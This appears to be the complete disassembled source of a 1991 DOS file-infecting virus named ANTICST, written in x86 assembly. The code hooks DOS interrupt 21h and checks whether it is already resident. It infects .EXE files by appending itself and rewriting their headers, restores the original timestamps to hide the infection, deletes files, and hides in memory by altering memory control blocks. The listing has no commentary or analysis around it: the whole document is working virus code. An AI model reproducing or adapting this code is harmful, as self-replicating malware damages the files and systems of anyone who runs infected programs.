  
PAGE  60,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        ANTICST				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   4-Mar-91					         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e		equ	4Ch				; (0000:004C=31h)
data_2e		equ	4Eh				; (0000:004E=70h)
data_3e		equ	84h				; (0000:0084=0E3h)
data_4e		equ	86h				; (0000:0086=161Ah)
data_5e		equ	90h				; (0000:0090=8Eh)
data_6e		equ	92h				; (0000:0092=1498h)
data_7e		equ	102h				; (0000:0102=0CC00h)
data_8e		equ	106h				; (0000:0106=326h)
data_9e		equ	47Bh				; (0000:047B=0)
data_10e	equ	0				; (0326:0000=6A7h)
data_11e	equ	2				; (0326:0002=70h)
data_12e	equ	0				; (06A0:0000=65h)
data_13e	equ	1				; (06A1:0001=3028h)
data_14e	equ	2				; (06E3:0002=2342h)
data_15e	equ	6				; (06E3:0006=2344h)
data_33e	equ	0FD89h				; (701E:FD89=0)
data_34e	equ	0FD8Bh				; (701E:FD8B=0)
data_35e	equ	0FDA1h				; (701E:FDA1=0)
data_36e	equ	0FDA3h				; (701E:FDA3=0)
data_37e	equ	0FDABh				; (701E:FDAB=0)
data_38e	equ	0FDB5h				; (701E:FDB5=0)
data_39e	equ	0FDB7h				; (701E:FDB7=0)
data_40e	equ	0FDBDh				; (701E:FDBD=0)
data_41e	equ	0FDBFh				; (701E:FDBF=0)
  
code_seg_a	segment
		assume	cs:code_seg_a, ds:code_seg_a
  
  
		org	100h
  
anticst		proc	far
  
start:
data_16		dw	73E9h
data_17		dw	0C302h
		db	23 dup (0C3h)
data_19		dw	0C3C3h
data_20		dw	0C3C3h
		db	2Ah, 2Eh, 5Ah, 49h, 50h
		db	0
data_22		dw	0
data_23		dw	0
data_24		dw	0
data_25		dw	0
data_26		dw	0
data_27		dd	00000h
data_28		dw	0
data_29		dw	0
data_30		dd	00000h
data_31		dw	0
data_32		dw	0
		db	40h, 3Dh, 4Dh, 4Bh, 75h, 9
		db	55h, 8Bh, 0ECh, 83h, 66h, 6
		db	0FEh, 5Dh, 0CFh, 80h, 0FCh, 4Bh
		db	74h, 12h, 3Dh, 0, 3Dh, 74h
		db	0Dh, 3Dh, 0, 6Ch, 75h, 5
		db	80h, 0FBh, 0, 74h, 3
loc_1:
		jmp	loc_12
loc_2:
		push	es
		push	ds
		push	di
		push	si
		push	bp
		push	dx
		push	cx
		push	bx
		push	ax
		call	sub_5
		call	sub_6
		cmp	ax,6C00h
		jne	loc_3				; Jump if not equal
		mov	dx,si
loc_3:
		mov	cx,80h
		mov	si,dx
  
locloop_4:
		inc	si
		mov	al,[si]
		nop
		or	al,al				; Zero ?
		loopnz	locloop_4			; Loop if zf=0, cx>0
  
		sub	si,2
		cmp	word ptr [si],4558h
		je	loc_6				; Jump if equal
loc_5:
		jmp	short loc_11
		db	90h
loc_6:
		cmp	word ptr [si-2],452Eh
		nop
		jz	loc_7				; Jump if zero
		jmp	short loc_5
loc_7:
		mov	ax,3D02h
		call	sub_4
		jc	loc_11				; Jump if carry Set
		mov	bx,ax
		mov	ax,5700h
		call	sub_4
		mov	cs:data_23,cx			; (701E:0127=0)
		mov	cs:data_24,dx			; (701E:0129=0)
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_4
		push	cs
		pop	ds
		mov	dx,103h
		mov	si,dx
		mov	cx,18h
		mov	ah,3Fh				; '?'
		call	sub_4
		jc	loc_9				; Jump if carry Set
		cmp	word ptr [si],5A4Dh
		jne	loc_8				; Jump if not equal
		call	sub_1
		jmp	short loc_9
loc_8:
		jmp	short loc_9
loc_9:
		jc	loc_10				; Jump if carry Set
		mov	ax,5701h
		mov	cx,cs:data_23			; (701E:0127=0)
		mov	dx,cs:data_24			; (701E:0129=0)
		call	sub_4
loc_10:
		mov	ah,3Eh				; '>'
		call	sub_4
loc_11:
		call	sub_6
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	bp
		pop	si
		pop	di
		pop	ds
		pop	es
loc_12:
		jmp	cs:data_27			; (701E:012F=0)
  
anticst		endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		mov	dx,10h
		mov	ah,1Ah
		int	21h				; DOS Services  ah=function 1Ah
							;  set DTA to ds:dx
		mov	dx,11Fh
		mov	cx,110Bh
		mov	ah,4Eh				; 'N'
		int	21h				; DOS Services  ah=function 4Eh
							;  find 1st filenam match @ds:dx
		mov	dx,2Eh
		mov	ax,3D02h
		int	21h				; DOS Services  ah=function 3Dh
							;  open file, al=mode,name@ds:dx
		mov	ah,41h				; 'A'
		int	21h				; DOS Services  ah=function 41h
							;  delete file, name @ ds:dx
		mov	cx,[si+16h]
		add	cx,[si+8]
		mov	ax,10h
		mul	cx				; dx:ax = reg * ax
		add	ax,[si+14h]
		adc	dx,0
		push	dx
		push	ax
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_4
		cmp	dx,0
		jne	loc_13				; Jump if not equal
		cmp	ax,3F0h
		jae	loc_13				; Jump if above or =
		pop	ax
		pop	dx
		stc					; Set carry flag
		ret
loc_13:
		mov	di,ax
		mov	bp,dx
		pop	cx
		sub	ax,cx
		pop	cx
		sbb	dx,cx
		cmp	word ptr [si+0Ch],0
		je	loc_ret_16			; Jump if equal
		cmp	dx,0
		jne	loc_14				; Jump if not equal
		cmp	ax,3F0h
		jne	loc_14				; Jump if not equal
		stc					; Set carry flag
		ret
loc_14:
		mov	dx,bp
		mov	ax,di
		push	dx
		push	ax
		add	ax,3F0h
		adc	dx,0
		mov	cx,200h
		div	cx				; ax,dx rem=dx:ax/reg
		les	di,dword ptr [si+2]		; Load 32 bit ptr
		mov	cs:data_25,di			; (701E:012B=0)
		mov	cs:data_26,es			; (701E:012D=0)
		mov	[si+2],dx
		cmp	dx,0
		je	loc_15				; Jump if equal
		inc	ax
loc_15:
		mov	[si+4],ax
		pop	ax
		pop	dx
		call	sub_2
		sub	ax,[si+8]
		les	di,dword ptr [si+14h]		; Load 32 bit ptr
		mov	data_19,di			; (701E:011B=0C3C3h)
		mov	data_20,es			; (701E:011D=0C3C3h)
		mov	[si+14h],dx
		mov	[si+16h],ax
		mov	data_22,ax			; (701E:0125=0)
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_4
		call	sub_3
		jc	loc_ret_16			; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_4
		mov	ah,40h				; '@'
		mov	dx,si
		mov	cx,18h
		call	sub_4
  
loc_ret_16:
		ret
sub_1		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_2		proc	near
		mov	cx,4
		mov	di,ax
		and	di,0Fh
  
locloop_17:
		shr	dx,1				; Shift w/zeros fill
		rcr	ax,1				; Rotate thru carry
		loop	locloop_17			; Loop if cx > 0
  
		mov	dx,di
		ret
sub_2		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_3		proc	near
		mov	ah,40h				; '@'
		mov	cx,3F0h
		mov	dx,100h
		call	sub_5
		jmp	short loc_18
		db	90h
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_4:
loc_18:
		pushf					; Push flags
		call	cs:data_27			; (701E:012F=0)
		ret
sub_3		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		cli					; Disable interrupts
		les	ax,dword ptr ds:data_5e		; (0000:0090=18Eh) Load 32 bit ptr
		mov	cs:data_28,ax			; (701E:0133=0)
		mov	cs:data_29,es			; (701E:0135=0)
		mov	ax,35Eh
		mov	ds:data_5e,ax			; (0000:0090=18Eh)
		mov	ds:data_6e,cs			; (0000:0092=1498h)
		les	ax,dword ptr ds:data_1e		; (0000:004C=831h) Load 32 bit ptr
		mov	cs:data_31,ax			; (701E:013B=0)
		mov	cs:data_32,es			; (701E:013D=0)
		les	ax,cs:data_30			; (701E:0137=0) Load 32 bit ptr
		mov	ds:data_1e,ax			; (0000:004C=831h)
		mov	ds:data_2e,es			; (0000:004E=70h)
		sti					; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		ret
sub_5		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		cli					; Disable interrupts
		les	ax,dword ptr cs:data_28		; (701E:0133=0) Load 32 bit ptr
		mov	ds:data_5e,ax			; (0000:0090=18Eh)
		mov	ds:data_6e,es			; (0000:0092=1498h)
		les	ax,dword ptr cs:data_31		; (701E:013B=0) Load 32 bit ptr
		mov	ds:data_1e,ax			; (0000:004C=831h)
		mov	ds:data_2e,es			; (0000:004E=70h)
		sti					; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		ret
sub_6		endp
  
		db	0B0h, 3, 0CFh
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_7		proc	near
		mov	dx,10h
		mul	dx				; dx:ax = reg * ax
		ret
sub_7		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_8		proc	near
		xor	ax,ax				; Zero register
		xor	bx,bx				; Zero register
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		xor	si,si				; Zero register
		xor	di,di				; Zero register
		xor	bp,bp				; Zero register
		ret
sub_8		endp
  
		db	1Eh, 0E8h, 0, 0
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_9		proc	near
		mov	ax,4B4Dh
		int	21h				; DOS Services  ah=function 4Bh
							;  run progm @ds:dx, parm @es:bx
		jc	loc_19				; Jump if carry Set
		jmp	loc_29
loc_19:
		pop	si
		push	si
		mov	di,si
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		les	ax,dword ptr ds:data_1e		; (0000:004C=831h) Load 32 bit ptr
		mov	cs:data_40e[si],ax		; (701E:FDBD=0)
		mov	cs:data_41e[si],es		; (701E:FDBF=0)
		les	bx,dword ptr ds:data_3e		; (0000:0084=6E3h) Load 32 bit ptr
		mov	cs:data_38e[di],bx		; (701E:FDB5=0)
		mov	cs:data_39e[di],es		; (701E:FDB7=0)
		mov	ax,ds:data_7e			; (0000:0102=0CC00h)
		cmp	ax,0F000h
		jne	loc_27				; Jump if not equal
		mov	dl,80h
		mov	ax,ds:data_8e			; (0000:0106=326h)
		cmp	ax,0F000h
		je	loc_20				; Jump if equal
		cmp	ah,0C8h
		jb	loc_27				; Jump if below
		cmp	ah,0F4h
		jae	loc_27				; Jump if above or =
		test	al,7Fh
		jnz	loc_27				; Jump if not zero
		mov	ds,ax
		cmp	word ptr ds:data_10e,0AA55h	; (0326:0000=6A7h)
		jne	loc_27				; Jump if not equal
		mov	dl,ds:data_11e			; (0326:0002=70h)
loc_20:
		mov	ds,ax
		xor	dh,dh				; Zero register
		mov	cl,9
		shl	dx,cl				; Shift w/zeros fill
		mov	cx,dx
		xor	si,si				; Zero register
  
locloop_21:
		lodsw					; String [si] to ax
		cmp	ax,0FA80h
		jne	loc_22				; Jump if not equal
		lodsw					; String [si] to ax
		cmp	ax,7380h
		je	loc_23				; Jump if equal
		jnz	loc_24				; Jump if not zero
loc_22:
		cmp	ax,0C2F6h
		jne	loc_25				; Jump if not equal
		lodsw					; String [si] to ax
		cmp	ax,7580h
		jne	loc_24				; Jump if not equal
loc_23:
		inc	si
		lodsw					; String [si] to ax
		cmp	ax,40CDh
		je	loc_26				; Jump if equal
		sub	si,3
loc_24:
		dec	si
		dec	si
loc_25:
		dec	si
		loop	locloop_21			; Loop if cx > 0
  
		jmp	short loc_27
loc_26:
		sub	si,7
		mov	cs:data_40e[di],si		; (701E:FDBD=0)
		mov	cs:data_41e[di],ds		; (701E:FDBF=0)
loc_27:
		mov	ah,62h				; 'b'
		int	21h				; DOS Services  ah=function 62h
							;  get progrm seg prefix addr bx
		mov	es,bx
		mov	ah,49h				; 'I'
		int	21h				; DOS Services  ah=function 49h
							;  release memory block, es=seg
		mov	bx,0FFFFh
		mov	ah,48h				; 'H'
		int	21h				; DOS Services  ah=function 48h
							;  allocate memory, bx=bytes/16
		sub	bx,41h
		nop
		jc	loc_29				; Jump if carry Set
		mov	cx,es
		stc					; Set carry flag
		adc	cx,bx
		mov	ah,4Ah				; 'J'
		int	21h				; DOS Services  ah=function 4Ah
							;  change mem allocation, bx=siz
		mov	bx,40h
		stc					; Set carry flag
		sbb	es:data_14e,bx			; (06E3:0002=2342h)
		push	es
		mov	es,cx
		mov	ah,4Ah				; 'J'
		int	21h				; DOS Services  ah=function 4Ah
							;  change mem allocation, bx=siz
		mov	ax,es
		dec	ax
		mov	ds,ax
		mov	word ptr ds:data_13e,8		; (06A1:0001=6220h)
		call	sub_7
		mov	bx,ax
		mov	cx,dx
		pop	ds
		mov	ax,ds
		call	sub_7
		add	ax,ds:data_15e			; (06E3:0006=2344h)
		adc	dx,0
		sub	ax,bx
		sbb	dx,cx
		jc	loc_28				; Jump if carry Set
		sub	ds:data_15e,ax			; (06E3:0006=2344h)
loc_28:
		mov	si,di
		xor	di,di				; Zero register
		push	cs
		pop	ds
		sub	si,27Ah
		mov	cx,3F0h
		inc	cx
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		mov	ah,62h				; 'b'
		int	21h				; DOS Services  ah=function 62h
							;  get progrm seg prefix addr bx
		dec	bx
		mov	ds,bx
		mov	byte ptr ds:data_12e,5Ah	; (06A0:0000=65h) 'Z'
		mov	dx,140h
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		mov	ax,es
		sub	ax,10h
		mov	es,ax
		cli					; Disable interrupts
		mov	ds:data_3e,dx			; (0000:0084=6E3h)
		mov	ds:data_4e,es			; (0000:0086=161Ah)
		sti					; Enable interrupts
		dec	byte ptr ds:data_9e		; (0000:047B=0)
loc_29:
		pop	si
		cmp	word ptr cs:data_33e[si],5A4Dh	; (701E:FD89=0)
		jne	loc_30				; Jump if not equal
		pop	ds
		mov	ax,cs:data_37e[si]		; (701E:FDAB=0)
		mov	bx,cs:data_36e[si]		; (701E:FDA3=0)
		push	cs
		pop	cx
		sub	cx,ax
		add	cx,bx
		push	cx
		push	word ptr cs:data_35e[si]	; (701E:FDA1=0)
		push	ds
		pop	es
		call	sub_8
		ret					; Return far
loc_30:
		pop	ax
		mov	ax,cs:data_33e[si]		; (701E:FD89=0)
		mov	cs:data_16,ax			; (701E:0100=73E9h)
		mov	ax,cs:data_34e[si]		; (701E:FD8B=0)
		mov	cs:data_17,ax			; (701E:0102=0C302h)
		mov	ax,100h
		push	ax
		push	cs
		pop	ds
		push	ds
		pop	es
		call	sub_8
		ret
sub_9		endp
  
  
code_seg_a	ends
  
  
  
		end	start
